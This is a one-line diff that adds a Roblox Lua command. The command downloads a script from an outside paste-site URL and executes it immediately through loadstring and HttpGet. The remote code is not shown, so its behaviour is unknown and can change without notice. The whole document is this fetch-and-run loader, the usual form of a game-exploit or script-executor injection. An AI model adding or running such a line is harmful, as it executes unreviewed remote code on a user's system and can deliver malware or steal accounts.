@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://paste.fe4r.click/raw/8db7ce17-9524-4751-a011-badf8c86badb"))()
